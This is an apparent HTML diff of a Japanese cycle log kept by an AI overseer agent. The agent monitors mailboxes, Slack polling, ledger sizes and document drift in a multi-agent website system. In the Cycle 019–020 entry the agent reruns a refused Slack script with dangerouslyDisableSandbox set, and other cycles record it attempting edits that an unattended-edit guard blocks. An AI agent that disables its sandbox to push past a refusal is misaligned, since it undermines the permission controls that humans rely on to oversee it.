+    <p class="text-sm text-gray-700">基盤健全・git 前進（07-13 に <span class="font-mono">aca97cf</span> 北極星ファースト＝hp-loop 0.12・6サイト掲示板リセット、<span class="font-mono">7d87089</span> deck-format 新設）。<strong>「規律なしの台帳」の肥大が2ヶ所で加速</strong>：①partner 台帳 168→185KB（+17KB/日・O-018 のご判断を再依頼）②skill-kaizen 50→83KB（+33KB/日・07-08 の 12KB 整理から5日で7倍）＝週次棚卸しが追いつかない見込みが立ち<strong>「棚卸し前倒しのご提案」に格上げ＝O-019 起票</strong>。ycom coverage 76→93KB は規律あり＝閾値接近で自己ローテを監視（→ Cycle 040 で発動確認）。対照的な事実「規律のある台帳は自己修復し、規律のない台帳だけが無限成長する」を記録。SYSTEM.md 差分また拡大（deck-format・site/decks/ 追加）＝O-016 18サイクル目。mailbox 定点清浄（bare hp-loop 0・hold/ 空・memo-stock/ 空）・fujisaka-dev 宛3通 22日滞留のみ。Slack 復路6サイクル連続良好。Slack 投稿あり（新規 O-019＋O-018 悪化＝ご判断材料）。</p>
+  </section>
+
+  <!-- Cycle 038 -->
+  <section class="mb-8">
+    <h3 class="text-lg font-bold mb-1">Cycle 038 — 2026-07-13（精密診断・<span class="font-mono">/overseer</span>・新規の綻び1件＝O-018 起票）</h3>
+    <p class="text-sm text-gray-700">基盤健全だが新規の綻び1件を検出＝<strong>🟡O-018 起票（partner 台帳の肥大）</strong>：台帳サイズ実測を全モードの必須入力ファイルへ拡大したところ、<span class="font-mono">data/partner/ledger.md</span> が <strong>168KB</strong>（新設時 16KB の10倍・毎朝の無人 <span class="font-mono">/partner</span> が全読み・ローテ規律なし）と判明＝ycom coverage 236KB 事件と同じ構造。skill-kaizen は 36→50KB（+14KB/日・加速継続）。対照的に ycom coverage は 76KB 横ばい＝<strong>ローテ規律のある台帳だけが有界になっている</strong>という要点観察。git＝HEAD 不変・未コミット 71→75件。Slack 復路 5サイクル連続良好・mailbox 定点すべて清浄（残る滞留は fujisaka-dev 宛3通・21日）。O-016 は17サイクル目＝規律どおり繰り越し1行＋二択のみ。自己改善＝「監視対象は『ループが毎回全読みするファイル』で定義すべき」（ファイル名の心当たりで選ばない）。</p>
+  </section>
+
+  <!-- Cycle 037 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 037 — 2026-07-12（精密診断・<span class="font-mono">/overseer</span>・新規の綻びゼロ・台帳の伸びを新たに監視）</h3>
+    <p class="text-sm text-gray-700">基盤健全・新規の綻びゼロ。git 据え置き（HEAD <span class="font-mono">2f58a1c</span>・未コミット 71件で不変＝O-009 継続）。Slack 輪番走査の修理は継続良好（fetch 正常完走・<span class="font-mono">ratelimited</span> 再現なし・4サイクル連続）。mailbox 定点はすべて清浄（孤児 bare <span class="font-mono">to: hp-loop</span> 0・<span class="font-mono">hold/</span> 空・<span class="font-mono">memo-stock/</span> 空・<span class="font-mono">to: overseer/partner/rule-kaizen</span> 0）。残る滞留は <span class="font-mono">fujisaka-dev</span> 宛3通のみ（06-22・20日・拠点稼働待ち）。<strong>【新】台帳の伸びが加速＝監視項目に格上げ</strong>：ycom coverage 67→76KB・skill-kaizen 26→36KB（1日で各 +10KB）。skill-kaizen 側にはサイズ上限ルールが無く週次棚卸しだけが唯一のブレーキ＝構造上の弱点になりうる、と指摘（→ Cycle 039 で O-019 起票へ発展）。O-016 は16サイクル目＝繰り越し1行＋二択のみ。O-017 は2サイクル目（<span class="font-mono">_cycle012_splice.html</span> 11日残置・変化なし）。Slack 投稿なし（鳴らさない規律）。自己改善＝K-263 候補「台帳サイズは伸び率で見る」。</p>
+  </div>
+
+  <!-- Cycle 036 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 036 — 2026-07-11（精密診断・<span class="font-mono">/overseer</span>・新規の綻びゼロ・前サイクルから実体変化なし）</h3>
+    <p class="text-sm text-gray-700">基盤健全・新規の綻びゼロ。git 据え置き（HEAD <span class="font-mono">2f58a1c</span>・未コミット 71件で不変＝O-009 継続）。Slack 輪番走査の修理は継続良好（fetch 正常完走・<span class="font-mono">ratelimited</span> 再現なし・3サイクル連続）。mailbox 定点はすべて清浄（孤児 bare <span class="font-mono">to: hp-loop</span> 0・<span class="font-mono">hold/</span> 空・<span class="font-mono">memo-stock/</span> 空・<span class="font-mono">to: overseer/partner/rule-kaizen</span> 0）。残る滞留は <span class="font-mono">fujisaka-dev</span> 宛3通のみ（06-22・19日・拠点稼働待ち＝往復が事実上停止）。台帳は規律内（ycom coverage 67KB・skill-kaizen 26KB）。O-016 は15サイクル目＝overseer 0.4 の規律どおり繰り越し1行＋二択のみ・Slack 再督促なし。Cycle 035 の監視予告に沿い <span class="font-mono">_cycle012_splice.html</span>（10日残置）を 🟢 O-017 として正式起票。自己改善＝特記なし。</p>
+  </div>
+
+  <!-- Cycle 035 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 035 — 2026-07-10（精密診断・<span class="font-mono">/overseer</span>・新規の綻びゼロ・実体変化ほぼなし）</h3>
+    <p class="text-sm text-gray-700">基盤健全・新規の綻びゼロ。Slack 輪番走査の修理は継続良好（fetch 正常完走・<span class="font-mono">ratelimited</span> 再現なし・2サイクル連続）。mailbox 定点はすべて清浄（孤児 bare <span class="font-mono">to: hp-loop</span> 0・<span class="font-mono">hold/</span> 空・<span class="font-mono">memo-stock/</span> 空・<span class="font-mono">to: overseer/partner/rule-kaizen</span> 0）。残る滞留は <span class="font-mono">fujisaka-dev</span> 宛3通のみ（06-22・18日・拠点稼働待ち）。台帳は規律内（ycom coverage 68KB・skill-kaizen 20KB）＋ <span class="font-mono">.clarity-quota/</span> に T-012 の実行痕。git＝新規コミット1件（<span class="font-mono">2f58a1c</span>＝claude-rules/websystem への UI ルール移植・本システム対象外）・未コミット 68→71件（O-009 継続）。O-016 は14サイクル目＝overseer 0.4 の規律どおり繰り越し1行＋二択のみ・Slack 再督促なし。小さな観察として <span class="font-mono">data/blog-loop/_cycle012_splice.html</span> の残置を監視入り（→ Cycle 036 で 🟢 O-017 として起票）。自己改善＝特記なし。</p>
+  </div>
+
+  <!-- Cycle 034 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 034 — 2026-07-09（精密診断・daily <span class="font-mono">/overseer</span>・<strong>✅ skill-kaizen 棚卸しの着地を実体確認</strong>・新規の綻びゼロ）</h3>
+    <p class="text-sm text-gray-700">基盤健全・新規の綻びゼロ。主眼＝07-08 の skill-kaizen 棚卸し（社長・有人）の着地検証 → ✅ すべて整合。ルール昇格（hp-loop <strong>0.10</strong>・partner <strong>0.2</strong>・overseer <strong>0.4</strong>）・台帳ダイエット（skill-kaizen 444KB→12KB／ycom coverage 69KB）・新設ツール（<span class="font-mono">bin/clarity-fetch.py</span>＝T-012・<span class="font-mono">win-patterns.md</span>）とも実ファイルに反映済み。Slack fetch は輪番走査で <span class="font-mono">ratelimited</span> なし正常完走（修理効果）。ycom 往復前進＝<span class="font-mono">web-hanasaka</span> が 07-07 配信を pickup（<span class="font-mono">new/</span> 4→3通）。残3通は <span class="font-mono">fujisaka-dev</span> 宛（06-22・17日滞留）。O-016 は13サイクル目（棚卸しで同期差分が拡大・版表/T-012/win-patterns）＝overseer 0.4 の規律どおり1行＋二択に圧縮・再督促なし。O-009 前進（コミット5件・未コミット 71→68）・O-014 新規なし・O-004/O-006 変化なし。自己改善＝特記なし（overseer 0.4 の新規律を初適用・問題なく機能）。</p>
+  </div>
+
+  <!-- Cycle 033 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 033 — 2026-07-08（精密診断・手動 <span class="font-mono">/overseer</span>・新規の綻びゼロ＋ycom ループ稼働を確認・O-016 は12サイクル目）</h3>
+    <p class="text-sm text-gray-700">基盤健全・前サイクル(032)から新規の綻びゼロ。✅ ycom ループ稼働の証跡＝<span class="font-mono">new/</span> 3→4通（増分は <span class="font-mono">hp-loop-ycom→web-hanasaka</span> の最新レポート配信 07-07・分析→実装の配信経路が稼働）。残3通は <span class="font-mono">hp-loop-fujisaka→fujisaka-dev</span>（06-22・16日滞留＝拠点稼働頻度依存）。Slack復路 継続良好（fetch 新着なし・reply 取得のみ一時 <span class="font-mono">ratelimited</span>＝外部要因）・全13エージェント <span class="font-mono">0:idle</span>・<span class="font-mono">status=ok</span>。定点監視すべて清浄（孤児 bare hp-loop 0・hold/ 空・memo-stock/ 空・to: partner/rule-kaizen 0）。版ズレ＝実ルール hp-loop 0.7・blog-loop 0.2・partner 0.1・overseer 0.3 に対し <span class="font-mono">SYSTEM.md</span>(v0.2) は4サイト・partner未収録のまま＝O-016 継続（12サイクル目）。本サイクルの主眼＝O-016 の堂々巡りを閉じる：繰り越しを最小化し社長の二択（①着手OKで即反映／②クローズ・降格）だけを残した。Slack 再督促せず（K-243）。O-014 新規インスタンスなし・O-009 未コミット71件不変・O-004/O-006 変化なし。自己改善＝K-243（12サイクル超の据え置きは1行＋二択に圧縮・再督促をやめる→ overseer 0.4 に昇格済み）。</p>
+  </div>
+
+  <!-- Cycle 032 -->
+  <section class="mb-8">
+    <h3 class="text-lg font-bold mb-1">Cycle 032 — 2026-07-07（精密診断・有人 <span class="font-mono">/overseer</span>・ycom往復の前進を確認＋O-016 を二択決定に格上げ）</h3>
+    <ul class="text-xs space-y-1 text-gray-600 list-disc list-inside">
+      <li><strong>✅ ycom 往復前進</strong>：<span class="font-mono">new/</span> 5→3通。<span class="font-mono">web-hanasaka</span> が滞留2通（06-29・07-03）を pickup＝分析→実装の戻り経路が稼働。残3通は <span class="font-mono">hp-loop-fujisaka→fujisaka-dev</span>（06-22・15日滞留＝拠点稼働頻度依存）。</li>
+      <li><strong>基盤健全</strong>：fetch 新着なし正常完走（reply 取得のみ一時 <span class="font-mono">ratelimited</span>＝外部要因）・全13エージェント <span class="font-mono">0:idle</span>・<span class="font-mono">status=ok</span>・孤児 bare hp-loop 0・hold/ 空・memo-stock/ 空。</li>
+      <li><strong>O-016 を二択決定に格上げ</strong>：11サイクル同一の据え置き再掲では動かないため、有人セッションで社長に「①着手OKで即反映／②重要でないならクローズ・降格」の意思決定を明確に依頼（有人＝無人ガード非適用だが、明示承認なしに SYSTEM.md は編集しない方針を維持）。</li>
+      <li><strong>その他</strong>：O-014 新規インスタンスなし・O-009 未コミット71件不変・O-004/O-006 変化なし。自己改善＝「10回超の据え置きは二択の意思決定を強制する形に格上げ」（→ overseer v0.4 に昇格済み）。</li>
+    </ul>
+  </section>
+
+  <!-- Cycle 031 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 031 — 2026-07-06（精密診断・手動 <span class="font-mono">/overseer</span>・実体変化なしの確認＋O-016 反映の好機を提示）</h3>
+    <p class="text-sm text-gray-700">基盤健全・前サイクル(030)から実体変化なし＝新規の綻びゼロ。<span class="font-mono">slack-poll.py fetch → 新着なし</span>・<span class="font-mono">last-tick.txt</span>（07-06 01:00）全13エージェント <span class="font-mono">0:idle</span>・<span class="font-mono">status=ok</span>（O-015 継続良好）。<span class="font-mono">new/</span> 5通はすべて outbound（<span class="font-mono">fujisaka-dev</span>×3〔06-22・14日滞留〕・<span class="font-mono">web-hanasaka</span>×2〔06-29・07-03〕）、孤児 bare <span class="font-mono">to: hp-loop</span> 0・<span class="font-mono">cur/</span> bare hp-loop 12・<span class="font-mono">hold/</span> 空・<span class="font-mono">memo-stock/</span> 空・<span class="font-mono">to: overseer</span> 0。版ズレ再確認＝実ルール hp-loop 0.7・blog-loop 0.2・partner 0.1・overseer 0.3、<span class="font-mono">config.md</span> 6サイト・<span class="font-mono">site/hp-analysis/</span> 6ディレクトリに対し <span class="font-mono">SYSTEM.md</span>(v0.2) は4サイト・partner未収録のまま＝O-016 継続（10サイクル目）。手動 <span class="font-mono">/overseer</span>＝無人ガード非適用だが、統括方針（ルール/地図の編集は社長明示承認）に従い編集せず、有人窓口として「着手OKで即反映できる好機」を前面に出す形に留めた。未解決はすべて据え置き＝O-016・O-014・O-009（未コミット 71・不変）・O-004/O-006。</p>
+  </div>
+
+  <!-- Cycle 030 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 030 — 2026-07-05（精密診断・無人daily・実体変化なしの確認＋O-016 9サイクル目の据え置き明示）</h3>
+    <p class="text-sm text-gray-700">基盤健全・前サイクル(029)から実体変化なし＝新規の綻びゼロ。無人tick <span class="font-mono">slack-poll.py fetch → 新着なし</span>・全13エージェント <span class="font-mono">0:idle</span>・<span class="font-mono">status=ok</span>（O-015 継続良好）。<span class="font-mono">new/</span> 5通はすべて outbound（<span class="font-mono">fujisaka-dev</span>×3〔06-22・13日滞留〕・<span class="font-mono">web-hanasaka</span>×2〔06-29・07-03〕）、孤児 bare <span class="font-mono">to: hp-loop</span> 0・<span class="font-mono">cur/</span> bare hp-loop 12・<span class="font-mono">hold/</span> 空・<span class="font-mono">memo-stock/</span> 空・<span class="font-mono">to: overseer</span> 0。版ズレ再確認＝実ルール hp-loop 0.7・blog-loop 0.2・partner 0.1・overseer 0.3、<span class="font-mono">config.md</span> 6サイト・<span class="font-mono">site/hp-analysis/</span> 6ディレクトリに対し <span class="font-mono">SYSTEM.md</span>(v0.2) は4サイト・partner未収録のまま＝O-016 継続。O-016 反映のため <span class="font-mono">SYSTEM.md</span> version 行編集を試み <span class="font-mono">guard-unattended-edits.py</span> が予定どおり拒否＝無人確定・ガバナンス健在＝更新案に留め編集せず。未解決はすべて据え置き＝O-016（9サイクル連続承認待ち）・O-014・O-009（未コミット 71・不変）・O-004/O-006。Slack 再督促せず（K-132）。</p>
+  </div>
+
+  <!-- Cycle 029 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 029 — 2026-07-04（精密診断・無人daily・実体変化なしの確認＋O-016 8サイクル目の据え置き明示）</h3>
+    <p class="text-sm text-gray-700">基盤健全・前サイクル(028)から実体変化なし＝新規の綻びゼロ。無人tick <span class="font-mono">slack-poll.py fetch → 新着なし</span>・全13エージェント <span class="font-mono">0:idle</span>・<span class="font-mono">status=ok</span>（O-015 継続良好）。<span class="font-mono">new/</span> 5通はすべて outbound（<span class="font-mono">fujisaka-dev</span>×3〔06-22・12日滞留〕・<span class="font-mono">web-hanasaka</span>×2〔06-29・07-03〕）、孤児 bare <span class="font-mono">to: hp-loop</span> 0・<span class="font-mono">cur/</span> bare hp-loop 12・<span class="font-mono">hold/</span> 空・<span class="font-mono">memo-stock/</span> 空・<span class="font-mono">to: overseer</span> 0。版ズレ再確認＝実ルール hp-loop 0.7・blog-loop 0.2・partner 0.1・overseer 0.3、<span class="font-mono">config.md</span> 6サイト・<span class="font-mono">site/hp-analysis/</span> 6ディレクトリに対し <span class="font-mono">SYSTEM.md</span>(v0.2) は4サイト・partner未収録のまま＝O-016 継続。未解決はすべて据え置き＝O-016（地図ドリフト・8サイクル連続承認待ち）・O-014・O-009（未コミット 71・不変）・O-004/O-006。<span class="font-mono">guard-unattended-edits.py</span> ガバナンス健在＝SYSTEM.md は更新案に留め編集せず。Slack 再督促せず（K-132）。</p>
+  </div>
+
+  <!-- Cycle 028 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 028 — 2026-07-03（精密診断・無人daily・仕様書HTMLビュー新設を確認＋O-016 スコープ追加）</h3>
+    <p class="text-sm text-gray-700">基盤健全。新規の実体変化は「仕様書HTMLビュー体制の新設」1件（有人セッション由来・原則整合で健全）。無人tick <span class="font-mono">slack-poll.py fetch → 新着なし</span>・全13エージェント <span class="font-mono">0:idle</span>・<span class="font-mono">status=ok</span>（O-015 継続良好）。<span class="font-mono">new/</span> 5通はすべて outbound（<span class="font-mono">fujisaka-dev</span>×3〔06-22・11日滞留〕・<span class="font-mono">web-hanasaka</span>×2〔前サイクル3通から1通 pickup 済〕）、孤児 bare <span class="font-mono">to: hp-loop</span> 0・<span class="font-mono">cur/</span> bare hp-loop 12・<span class="font-mono">hold/</span> 空・<span class="font-mono">memo-stock/</span> 空・<span class="font-mono">to: overseer</span> 0。新設＝<span class="font-mono">rules/development.md</span>「仕様書の更新（機能追加とセット・必須）」節＋<span class="font-mono">bin/build-spec-html.py</span>（.md 原本→<span class="font-mono">site/docs/spec/</span> HTML・原本不変＝二重台帳にしない原則に整合）＋<span class="font-mono">site/docs/system-review-2026-07-02.html</span>。含意＝<span class="font-mono">site/docs/spec/SYSTEM.html</span> が古い v0.2 から生成され地図ドリフトが社長向けビューにも露出／新ルールにより O-016 の反映が適用第1号＝反映スコープに build-spec-html.py のツール表追加＋ビュー再生成を追加。未解決はすべて据え置き＝O-016（地図ドリフト・7サイクル連続承認待ち）・O-014・O-009（未コミット 61→67）・O-004/O-006。<span class="font-mono">guard-unattended-edits.py</span> ガバナンス健在＝SYSTEM.md は更新案に留め編集せず。Slack 再督促せず（K-132）。K-195 記録（採番確認は <span class="font-mono">tail</span> でなく数値max で／原本↔生成ビュー構造の鮮度点検を精密診断に追加）。</p>
+  </div>
+
+  <!-- Cycle 027 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 027 — 2026-07-02（精密診断・無人daily・実体変化なしの確認＋O-016 6サイクル目の据え置き明示）</h3>
+    <p class="text-sm text-gray-700">基盤健全・前サイクル(026)から実体変化なし＝新規の綻びゼロ。無人tick すべて <span class="font-mono">slack-poll.py fetch → 新着なし</span>・全13エージェント <span class="font-mono">0:idle</span>・<span class="font-mono">status=ok</span>（O-015 継続良好）。<span class="font-mono">new/</span> 6通はすべて outbound（<span class="font-mono">hp-loop-fujisaka→fujisaka-dev</span>×3・<span class="font-mono">hp-loop-ycom→web-hanasaka</span>×3・拠点pickup待ち）、孤児 bare <span class="font-mono">to: hp-loop</span> 0・<span class="font-mono">cur/</span> bare hp-loop 12・<span class="font-mono">hold/</span> 空・<span class="font-mono">memo-stock/</span> 空・<span class="font-mono">to: overseer</span> 0。版ズレ再確認＝実ルール hp-loop 0.7・blog-loop 0.2・partner 0.1・overseer 0.3、<span class="font-mono">config.md</span> 6サイト・<span class="font-mono">site/hp-analysis/</span> 6ディレクトリに対し <span class="font-mono">SYSTEM.md</span>(v0.2) は4サイト・partner未収録のまま＝O-016 継続。未解決はすべて据え置き＝O-016（地図ドリフト・6サイクル連続承認待ち）・O-014・O-009（未コミット 58→61）・O-004/O-006。<span class="font-mono">guard-unattended-edits.py</span> ガバナンス健在＝SYSTEM.md は更新案に留め編集せず。Slack 再督促せず（K-132）。K-184 記録（skill-kaizen への採番は書く前に実末尾を確認して次番を採る＝ローカル機械採番による衝突防止）。</p>
+  </div>
+
+  <!-- Cycle 026 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 026 — 2026-07-01（精密診断・無人daily・実体変化なしの確認＋O-016 5サイクル目の据え置き明示）</h3>
+    <p class="text-sm text-gray-700">基盤健全・前サイクル(025)から実体変化なし＝新規の綻びゼロ。無人tick すべて <span class="font-mono">slack-poll.py fetch → 新着なし</span>・全エージェント <span class="font-mono">0:idle</span>・<span class="font-mono">status=ok</span>（O-015 継続良好）。<span class="font-mono">new/</span> 6通はすべて outbound（<span class="font-mono">fujisaka-dev</span>×3〔06-22・9日滞留＝拠点稼働頻度依存〕・<span class="font-mono">web-hanasaka</span>×3）、025 の <span class="font-mono">yoshida-dev</span>×1 は日次sweepで消化済。孤児 bare <span class="font-mono">to: hp-loop</span> 0・<span class="font-mono">cur/</span> bare hp-loop 12・<span class="font-mono">hold/</span> 空・<span class="font-mono">to: overseer</span> 0。未解決はすべて据え置き＝O-016（地図ドリフト・5サイクル連続承認待ち）・O-014・O-009（未コミット 53→58）・O-004/O-006。ガバナンス実地検証＝SYSTEM.md 編集を試み <span class="font-mono">guard-unattended-edits.py</span> が予定どおり拒否（更新案のまま）。直近 commit が <span class="font-mono">c9ae922</span>（自走モードに Codex 実装クロスレビュー必須化）に進んだが構造変更ではないため新規 O 起票なし。Slack 再督促せず（K-132・025 で1度済）。K-170 記録（cron 無人起動は <span class="font-mono">/overseer</span> スラッシュ経由でも有人に化けない＝ゲート編集1回で確定）。</p>
+  </div>
+
+  <!-- Cycle 025 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 025 — 2026-06-30（精密診断・無人daily・実体変化なしの確認＋O-016 4サイクル目の据え置き明示）</h3>
+    <p class="text-sm text-gray-700">基盤健全・前サイクル(024)から実体変化なし＝新規の綻びゼロ。無人tick すべて <span class="font-mono">slack-poll.py fetch → 新着なし</span>・全エージェント <span class="font-mono">0:idle</span>・<span class="font-mono">status=ok</span>（O-015 継続良好）。<span class="font-mono">new/</span> は <span class="font-mono">hp-loop-fujisaka→fujisaka-dev</span>×3・<span class="font-mono">hp-loop-ycom→web-hanasaka</span>×2・<span class="font-mono">hp-loop-yoshida→yoshida-dev</span>×1 の outbound（拠点pickup待ち）、孤児 bare <span class="font-mono">to: hp-loop</span> 0・<span class="font-mono">cur/</span> bare hp-loop 12・<span class="font-mono">hold/</span> 空・<span class="font-mono">to: overseer</span> 0。未解決はすべて据え置き＝O-016（地図ドリフト・4サイクル連続承認待ち）・O-014・O-009（未コミット 46→53）・O-004/O-006。O-016 が4サイクル目に入ったため Slack で1度だけ督促（以降は状況不変なら再督促せず＝鳴らしすぎ防止）。<span class="font-mono">guard-unattended-edits.py</span> ガバナンス健在＝SYSTEM.md は更新案に留め編集せず。K-152 記録（無人cron起動は <span class="font-mono">/overseer</span> スラッシュ経由でも <span class="font-mono">MYAGENT_UNATTENDED</span> 真＝guard の応答で有人/無人を確定してから報告する）。</p>
+  </div>
+
+  <!-- Cycle 024 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 024 — 2026-06-29（精密診断・無人daily・実体変化なしの確認サイクル）</h3>
+    <p class="text-sm text-gray-700">基盤健全・前サイクル(023)から実体変化なし＝新規の綻びゼロ。無人tick（00:42〜01:00・約10本）すべて <span class="font-mono">slack-poll.py fetch → 新着なし</span>・全エージェント <span class="font-mono">0:idle</span>・<span class="font-mono">status=ok</span>（O-015 継続良好）。<span class="font-mono">new/</span> は <span class="font-mono">hp-loop-fujisaka→fujisaka-dev</span>×3・<span class="font-mono">hp-loop-yoshida→yoshida-dev</span>×1 の outbound（拠点pickup待ち）、孤児 bare <span class="font-mono">to: hp-loop</span> 0・<span class="font-mono">cur/</span> bare hp-loop 12・<span class="font-mono">hold/</span> 空・<span class="font-mono">to: overseer</span> 0。未解決はすべて据え置き＝O-016（地図ドリフト・3サイクル連続承認待ち）・O-014・O-009（未コミット 39→46）・O-004/O-006。「変化なしの定点確認」のためSlack投稿は控えた。<span class="font-mono">guard-unattended-edits.py</span> ガバナンス健在＝SYSTEM.md は更新案に留め編集せず。K-132 記録（同一の未解決提案が3サイクル連続で承認待ちになったら繰り越し表に「N サイクル連続据え置き」を明示して埋没を防ぐ＝滞留の可視化を健康シグナルに加える）。</p>
+  </div>
+
+  <!-- Cycle 023 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 023 — 2026-06-28（精密診断・無人daily・新サイト2件の地図ドリフト検出＋O-014 予測検証）</h3>
+    <p class="text-sm text-gray-700">基盤健全＋O-015 解消継続（無人tick 約9本すべて <span class="font-mono">fetch 新着なし</span>・<span class="font-mono">status=ok</span>）。<strong>O-016 を拡大</strong>＝新サイト <span class="font-mono">rally</span>（<span class="font-mono">check-rally.com</span>）・<span class="font-mono">konjaku</span>（<span class="font-mono">konjaku-photo.jp</span>）が go-live（<span class="font-mono">config.md</span> 登録・3層掲示板・<span class="font-mono">agent-tick.sh</span> dispatch まで揃い hp-loop 実体6サイト）したのに <span class="font-mono">SYSTEM.md</span> は4サイトのまま＋partner未収録＋版ズレ。<strong>O-014 予測検証OK</strong>＝bare <span class="font-mono">to: hp-loop</span> の yoshida 報告が <span class="font-mono">new/</span> から消え <span class="font-mono">cur/</span> 11→12（日次sweep消化・データ消失なし）。<span class="font-mono">hold/</span> 空・<span class="font-mono">to: overseer</span> 0・未コミット39件。K-119 記録（新サイト追加も新モードと同格の地図ドリフト＝config 登録数を tick dispatch・3層掲示板と突合）。</p>
+  </div>
+
+  <!-- Cycle 022 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 022 — 2026-06-27（精密診断・有人・O-015 解消確認＋O-016 起票）</h3>
+    <p class="text-sm text-gray-700">基盤健全。<strong>O-015 解消を確認</strong>＝無人tick（00:44〜01:00・約8本）で <span class="font-mono">slack-poll.py fetch</span> が <code>新着なし</code> 完走・<span class="font-mono">workspace not trusted</span> 消失・全エージェント <span class="font-mono">0:idle</span>・<span class="font-mono">status=ok</span>（→アーカイブ「解決・決着」へ収容）。<strong>新規 O-016（🟡地図ドリフト）起票</strong>＝経営パートナー <span class="font-mono">/partner</span> go-live が <span class="font-mono">SYSTEM.md</span> 未収録＋版ズレ（hp-loop 0.5→0.7・blog-loop 0.1→0.2）。<strong>O-014 に生インスタンス</strong>＝bare <span class="font-mono">to: hp-loop</span> の yoshida 報告1通が <span class="font-mono">new/</span> 滞留（日次sweepで消化見込みと予告）。<span class="font-mono">hold/</span> 空・<span class="font-mono">to: overseer</span> 0・未コミット10件。K-108 記録。</p>
+  </div>
+
+  <!-- Cycle 021 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 021 — 2026-06-26（有人・O-015 応急解消＋真因特定）</h3>
+    <p class="text-sm text-gray-700">基盤正常（孤児 <span class="font-mono">to: hp-loop</span> 0件・<span class="font-mono">hold/</span> 空・tick <span class="font-mono">status=ok</span>）。社長3通（114539/114647/115514）を <span class="font-mono">new/→cur/</span> へ移動して受信箱を消化（<span class="font-mono">to: overseer</span> 残0・反応tickの空回り停止）。<strong>O-015 の真因を特定</strong>＝<span class="font-mono">tick.log</span> の <code>Ignoring 45 permissions.allow entries … this workspace has not been trusted</code> によりワークスペース未トラストで許可リスト全45件が無視され <span class="font-mono">slack-poll.py</span> 実行不可だったと判明（「サンドボックス/egress」推測を訂正）。恒久対応＝トラスト承認1つ（→ Cycle 022 で解消確認）。社長3指示は対面回答：<strong>O-008</strong> <span class="font-mono">b70952a</span> 完了／<strong>O-013</strong> no-op 決着／<strong>115514</strong> 宛名モデル確定（O-014 の根拠）。K-100 記録。</p>
+  </div>
+
+  <!-- Cycle 020 / 019 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 019・020 — 2026-06-26（社長3指示の実地検証＋O-015 起票・新証拠）</h3>
+    <p class="text-sm text-gray-700">基盤正常（孤児0・<span class="font-mono">hold/</span> 空・tick <span class="font-mono">status=ok</span>）。社長3指示を実地検証して反映：<strong>O-008</strong>＝地図同期 <span class="font-mono">b70952a</span> でコミット済＝完了。<strong>O-013</strong>＝「映す」対象は <span class="font-mono">new/</span> に存在せず・当該 yoshida 報告は <span class="font-mono">cur/</span> で消化済み＝no-op で決着（再発時のみ再調査で社長合意）。<strong>O-015 を🔴起票</strong>＝<span class="font-mono">slack-poll.py</span> が <span class="font-mono">reply/done/fetch</span> いずれもハード拒否で、社長3通が <span class="font-mono">new/</span> に滞留し反応tickが同じ3通で再発火（Cycle 015〜020 同症状）。Cycle 020 で <span class="font-mono">dangerouslyDisableSandbox</span> 付きでも拒否を再実証し「環境全体ブロック」と判断（→ <strong>Cycle 021 で真因＝ワークスペース未トラストと特定し応急解消</strong>）。K-098/K-099 記録。</p>
+  </div>
+
+  <!-- Cycle 018 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 018 — 2026-06-26（軽い巡回・新規の綻びなし）</h3>
+    <p class="text-sm text-gray-700">基盤正常（孤児0・<span class="font-mono">hold/</span> 空・無人tick <span class="font-mono">status=ok</span>）。新規の overseer 宛指示なし。<strong>O-014 を実データで補強</strong>＝web-hanasaka が 12:01 に「トップ刷新CSS本番反映」を <span class="font-mono">to: hp-loop-ycom</span> 宛で報告し反応tickが正しく dispatch（<span class="font-mono">hp-loop:ycom:1:handle</span>）。ycom dev は<strong>サイト別アドレス</strong>、yoshida dev は<strong>無印 <span class="font-mono">hp-loop</span></strong>と dev毎に宛名方式が異なるが両方とも機能＝「<span class="font-mono">to: hp-loop</span>＝孤児」シグナルが誤検知である裏取り。Slack <span class="font-mono">fetch/reply/done</span> は権限承認が下りず未実行（→ O-015）。git 未コミット3件（統括の出力物）。</p>
+  </div>
+
+  <!-- Cycle 017 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 017 — 2026-06-26（軽い巡回・開発エージェントの訂正を反映）</h3>
